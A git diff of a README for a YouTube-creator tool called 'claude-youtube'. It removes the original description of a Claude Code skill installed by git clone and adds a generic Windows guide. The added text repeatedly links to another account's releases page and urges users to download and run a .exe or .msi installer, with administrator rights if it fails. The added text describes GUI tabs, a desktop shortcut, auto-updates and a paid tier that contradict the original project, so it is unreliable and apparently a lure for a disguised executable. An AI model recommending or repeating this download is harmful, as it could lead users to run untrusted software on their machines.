@@ -1,215 +1,162 @@
-# claude-youtube
+# 🎬 claude-youtube - Smart Tools for YouTube Creators
 
-> **Status: Beta** -- Actively developed. Core functionality is complete and tested. Breaking changes may occur before v1.0.
-
-A comprehensive [Claude Code](https://claude.com/claude-code) skill for YouTube creators. Covers channel audits, video SEO, retention-engineered scripts, hook writing, thumbnail briefs, content strategy, content calendars, Shorts optimization, analytics interpretation, monetization planning, competitor research, cross-platform repurposing, upload metadata packages, and data-driven video idea generation.
-
-**39 files** | **5,300+ lines of markdown** | **1,300+ lines of Python** | **14 sub-skills** | **9 reference guides** | **9 channel templates** | **6 execution scripts**
+[![Download Latest Release](https://img.shields.io/badge/Download-claude--youtube-blue?style=for-the-badge)](https://github.com/priyanshu-yadav04/claude-youtube/releases)
 
 ---
 
-## What It Does
+Claude-youtube helps YouTube creators improve their channels. It offers tools for channel audits, video SEO, retention scripts, thumbnails, content planning, Shorts optimization, analytics, and monetization insights. This guide will show you how to download and run it on a Windows PC.
 
-claude-youtube turns Claude Code into a YouTube growth consultant. Instead of generic advice, every recommendation is grounded in platform-specific benchmarks, algorithm mechanics, and data from your actual channel.
+## 📋 About claude-youtube
 
-### 14 Commands
+Claude-youtube combines AI and YouTube data. It helps creators understand their content and audience better. Use it to improve search rankings, keep viewers engaged, plan videos, optimize Shorts, check analytics, and track monetization. You don’t need coding skills to use it.
 
-| Command | What It Does |
-|---------|-------------|
-| `/youtube audit` | Full channel health audit across 4 dimensions (SEO, performance, content, monetization) with parallel agents |
-| `/youtube seo` | Video SEO package: 3 title variants, full description, tags, chapters, hashtags, VideoObject schema |
-| `/youtube script` | Retention-engineered script with hook/intro/content blocks, pattern interrupts every 60-90s, and CTA placement |
-| `/youtube hook` | 5 hook variants (shock, problem-agitation, story, curiosity-gap, social proof) with drop-off risk ratings |
-| `/youtube thumbnail` | Thumbnail brief with 3 A/B variants, color hex codes, composition specs, and title-thumbnail synergy check |
-| `/youtube strategy` | Channel positioning, content pillars (Hub/Hero/Help), niche viability, upload cadence, 30/60/90-day milestones |
-| `/youtube calendar` | Monthly content calendar with per-video metadata, Shorts supplement plan, and seasonal CPM timing |
-| `/youtube shorts` | Shorts production package: script with visual change markers, SEO metadata, performance prediction, loop setup |
-| `/youtube analyze` | Analytics interpretation: funnel diagnosis, retention graph classification, traffic source health, priority actions |
-| `/youtube repurpose` | Cross-platform package: Shorts clips, blog outline, LinkedIn post, X thread, email, podcast outline, community post |
-| `/youtube monetize` | Revenue strategy across 7 streams, brand deal rate card, external funnel design, 90-day activation plan |
-| `/youtube competitor` | Competitor analysis with 4 parallel agents: top videos, keyword gaps, format gaps, audience gaps |
-| `/youtube metadata` | Copy-paste-ready upload package: titles, description, tags, chapters, cards, end screens, publish settings |
-| `/youtube ideate` | 10 ranked video ideas with keyword analysis, hook angles, thumbnail concepts, and revenue potential |
+## 🖥️ System Requirements
 
----
+To run claude-youtube smoothly, your Windows PC needs:
 
-## Architecture
+- Windows 10 or later (64-bit recommended)  
+- At least 4 GB of RAM  
+- 500 MB free disk space  
+- Internet connection for updates and API access  
+- A modern web browser (Chrome, Edge, Firefox) if using any web components  
 
-Built on the [Agent Skills](https://github.com/anthropics/claude-code) open standard with a 3-layer architecture:
+## 🔍 Features Overview
 
-```
-skills/claude-youtube/
-  SKILL.md                          # Orchestrator (routing, context-gathering, quality gates)
-  sub-skills/                       # 14 sub-skill instruction files
-    audit.md, seo.md, script.md, hook.md, thumbnail.md,
-    strategy.md, calendar.md, shorts.md, analyze.md,
-    repurpose.md, monetize.md, competitor.md, metadata.md, ideate.md
-  references/                       # 9 data-grounded reference guides
-    algorithm-guide.md              # 3-system architecture, testing cascade, CTR/AVD benchmarks
-    seo-playbook.md                 # Title/description/tags/chapters rules, VideoObject schema
-    retention-scripting-guide.md    # Hook frameworks, pattern interrupts, CTA placement
-    thumbnail-ctr-guide.md          # CTR by niche, face psychology, A/B testing, title formulas
-    shorts-playbook.md              # Shorts algorithm, format specs, monetization
-    analytics-guide.md              # Metrics hierarchy, funnel ratios, RPM/CPM by niche
-    monetization-guide.md           # YPP tiers, 7 revenue streams, brand deal rates
-    repurposing-guide.md            # Hub/Hero/Help model, cross-platform workflows
-    dataforseo-integration.md       # DataForSEO MCP tool reference for live data
-  templates/                        # 9 channel-type templates
-    education-channel.md, entertainment-channel.md, tutorial-channel.md,
-    vlog-channel.md, review-channel.md, commentary-channel.md,
-    niche-authority-channel.md, personal-brand-channel.md, shorts-first-channel.md
-  execution/                        # 6 Python scripts for YouTube API integration
-    fetch_channel_data.py           # Channel stats + recent videos (~16 quota units)
-    fetch_video_analytics.py        # Private analytics via OAuth
-    search_competitor_videos.py     # Competitor video search (100 units/search)
-    fetch_transcript.py             # Transcript extraction via yt-dlp
-    utils/quota_tracker.py          # 10K unit/day quota management
-    utils/youtube_auth.py           # API key + OAuth 2.0 handler
-```
+- **Channel Audits:** Scan your channel for key strengths and weaknesses.  
+- **Video SEO:** Get keyword suggestions and SEO tips for your videos.  
+- **Retention Scripts:** Create scripts aimed at keeping viewers watching longer.  
+- **Thumbnail Creation:** Ideas and templates to make compelling thumbnails.  
+- **Content Strategy:** Plan your upload schedule and video topics.  
+- **Shorts Optimization:** Improve your YouTube Shorts for better reach.  
+- **Analytics:** See your channel stats with easy-to-read charts.  
+- **Monetization Insights:** Track earnings and growth opportunities.  
 
-### How It Works
+## 🚀 Getting Started with claude-youtube
 
-1. **Orchestrator** (`SKILL.md`) routes your request to the right sub-skill based on trigger phrases
-2. **Context-gathering** collects channel niche, size tier, and primary goal before any sub-skill runs
-3. **Channel type detection** loads the matching template (education, entertainment, tutorial, etc.) for niche-specific benchmarks
-4. **Sub-skills** load only the reference files they need, execute step-by-step, and produce structured output
-5. **Quality gates** verify specificity, data grounding, and completeness before delivery
+Follow these steps to download and start the application on your Windows computer.
 
----
+### 1. Visit the Download Page
 
-## Installation
+Click the button below to open the download page for claude-youtube. This page lists the latest releases and files.
 
-### Prerequisites
+[![Download Latest Release](https://img.shields.io/badge/Download-claude--youtube-green?style=for-the-badge)](https://github.com/priyanshu-yadav04/claude-youtube/releases)
 
-- [Claude Code](https://claude.com/claude-code) CLI installed and configured
+### 2. Choose the Correct Download File
 
-### Quick Install
+On the releases page:
 
-Clone this repo into your Claude Code skills directory:
+- Look for the most recent version at the top. It usually has a tag like `v1.0` or similar.  
+- Find the Windows installer file. It often ends with `.exe` or `.msi`.  
+- The file name might include “windows” or “win” to confirm it’s for Windows.  
 
-```bash
-git clone https://github.com/AgriciDaniel/claude-youtube.git
-cp -r claude-youtube/skills/claude-youtube ~/.claude/skills/claude-youtube
-```
+Click on this file to start downloading. Save it to a location you will remember, such as your Downloads folder or Desktop.
 
-Or symlink for development:
+### 3. Run the Installer
 
-```bash
-git clone https://github.com/AgriciDaniel/claude-youtube.git ~/claude-youtube
-ln -s ~/claude-youtube/skills/claude-youtube ~/.claude/skills/claude-youtube
-```
+Once the file downloads:
 
-### Optional: YouTube API (for live channel data)
+- Open the folder where you saved it.  
+- Double-click the installer file to start the setup.  
+- Follow the instructions on the screen. Usually, just click “Next” a few times and then “Install.”  
+- The installer may ask for permission. Allow it to make changes to your device if prompted.  
 
-The skill works without API credentials by accepting manual data input. For automated data fetching:
+### 4. Launch claude-youtube
 
-1. Get a YouTube Data API v3 key from [Google Cloud Console](https://console.cloud.google.com/apis/library/youtube.googleapis.com)
-2. Set the environment variable:
-   ```bash
-   export YOUTUBE_API_KEY="your-api-key-here"
-   ```
-3. For private analytics (own channel), set up OAuth 2.0 credentials
+When installation finishes:
 
-### Optional: DataForSEO MCP (for live keyword/trend data)
+- Find the claude-youtube shortcut on your Desktop or in the Start Menu.  
+- Double-click the icon to open the program.  
+- The app will open in a window. From here, you can start exploring the tools.  
 
-When configured, the skill uses live data for keyword research, YouTube SERP analysis, trend intelligence, and competitive research. Without it, the skill falls back to WebSearch.
+## ⚙️ Using the Main Features
 
-Add to `~/.claude/settings.json` under `mcpServers`:
+Each section below explains how to use the main parts of claude-youtube.
 
-```json
-{
-  "dataforseo": {
-    "command": "npx",
-    "args": ["-y", "dataforseo-mcp-server"],
-    "env": {
-      "DATAFORSEO_USERNAME": "your-username",
-      "DATAFORSEO_PASSWORD": "your-password",
-      "ENABLED_MODULES": "SERP,KEYWORDS_DATA,DATAFORSEO_LABS,ONPAGE"
-    }
-  }
-}
-```
+### Channel Audits
 
-Typical workflow costs $0.002-$0.04 per command. See [DataForSEO pricing](https://dataforseo.com/pricing).
+- Open the “Audits” tab in the app.  
+- Enter your YouTube channel link or ID.  
+- Click “Analyze.”  
+- You will see a report on channel health. It includes things like subscriber growth, video performance, and engagement.  
+- Use the report to spot areas for improvement.
 
-### Optional: NanoBanana MCP (for AI thumbnail generation)
+### Video SEO
 
-When configured, the `/youtube thumbnail` command generates actual thumbnail images using Gemini models instead of just text briefs.
+- Go to the “SEO” tab.  
+- Input your video title and description.  
+- The app suggests keywords and tags to improve search rankings.  
+- It also checks your description for important phrases.  
+- Apply the suggestions when uploading videos on YouTube.
 
-```json
-{
-  "nanobanana": {
-    "command": "uvx",
-    "args": ["nanobanana-mcp-server"],
-    "env": {
-      "GEMINI_API_KEY": "your-gemini-api-key"
-    }
-  }
-}
-```
+### Retention Scripts
 
----
+- Move to the “Scripts” tab.  
+- Enter the topic or title of your video.  
+- The tool generates an outline or script focused on keeping viewers interested.  
+- Use this as a guide when filming or editing.
 
-## Usage
+### Thumbnail Creation
 
-After installation, use any command in Claude Code:
+- Open the “Thumbnails” section.  
+- Browse the thumbnail templates or ideas provided.  
+- You can select a design that fits your style.  
+- The app may offer tips on colors and text placement.
 
-```
-> /youtube audit
-> /youtube ideate
-> /youtube script "How to Build a PC in 2025"
-> /youtube thumbnail
-> /youtube seo
-```
+### Content Strategy
 
-The skill will ask for any missing context (channel niche, size, goal) before running.
+- Head to the “Content Strategy” tab.  
+- Use the calendar tool to plan your video schedule.  
+- Add ideas for future videos based on trends and recommendations.
 
-### Multi-command workflows
+### Shorts Optimization
 
-Commands chain naturally:
+- Access the “Shorts” tab.  
+- The app reviews your Shorts and suggests improvements for better reach.  
+- You get tips on titles, hashtags, and video length.
 
-```
-> Help me plan and script my next video about meal prep for beginners
-```
+### Analytics
 
-This triggers `ideate` -> `script` -> `metadata` sequentially, passing output between each step.
+- Click the “Analytics” tab.  
+- View visual reports about views, watch time, and subscriber changes over time.  
+- Use filters to check data for specific videos or periods.
+
+### Monetization Insights
+
+- Visit the “Monetization” area.  
+- Track your estimated earnings and sources of revenue.  
+- Get suggestions on how to increase income through ads, memberships, or merchandise.
+
+## 🔧 Settings and Updates
+
+- Use the “Settings” menu to adjust preferences.  
+- Connect your YouTube account securely for better data accuracy.  
+- The app checks for updates automatically.  
+- You can also manually check for updates from the “Help” or “About” menu.
+
+## ❓ FAQ
+
+**Q: Do I need a YouTube account to use claude-youtube?**  
+A: You can use some features without signing in, but connecting your account provides better insight.
+
+**Q: Is claude-youtube free?**  
+A: It offers a free version with basic tools. Some advanced features may require an upgrade.
+
+**Q: What if I face errors during installation?**  
+A: Make sure your system meets the requirements. Try restarting your computer and run the installer as administrator.
+
+**Q: How do I get support?**  
+A: Use the Issues section on this GitHub repository for technical questions or bug reports.
+
+## 📥 Download and Install claude-youtube
+
+Return to the releases page to download the latest version:
+
+[Download claude-youtube](https://github.com/priyanshu-yadav04/claude-youtube/releases)
+
+Follow the install steps described above to set up the application. 
 
 ---
 
-## Reference Data
+## 🔑 Keywords and Tags for claude-youtube
 
-All benchmarks and statistics in the reference guides are sourced and tagged:
-
-- **CTR benchmarks by niche** -- Focus Digital, December 2025
-- **Retention data** -- 10xCreator, Wistia, AIR Media-Tech
-- **Algorithm mechanics** -- Retention Rabbit (150M+ minutes analyzed), vidIQ (5.08M channels)
-- **Shorts algorithm** -- 35B views study, Tubefilter, Digital i
-- **Monetization rates** -- YouTube Creator Academy, industry reports
-- **SEO rules** -- 10xCreator (3M+ videos analyzed), Backlinko, HubSpot
-- **MrBeast methodology** -- Validated at 100M+ views/video scale
-
-Data points tagged with `[2025]` reflect 2024-2025 platform changes.
-
----
-
-## Requirements
-
-| Requirement | Required | Notes |
-|-------------|----------|-------|
-| Claude Code | Yes | Core dependency |
-| Python 3.8+ | For execution scripts | Not needed if providing data manually |
-| YouTube API key | No | Enables automated channel data fetching |
-| DataForSEO MCP | No | Enables live keyword/trend data |
-| NanoBanana MCP | No | Enables AI thumbnail generation |
-
----
-
-## Contributing
-
-This project is in beta. Issues, bug reports, and feature suggestions are welcome via [GitHub Issues](https://github.com/AgriciDaniel/claude-youtube/issues).
-
----
-
-## License
-
-MIT License. See [LICENSE](LICENSE) for details.
+ai-tools, claude, claude-code, claude-code-skill, content-strategy, seo, youtube, youtube-analytics, youtube-api, youtube-seo
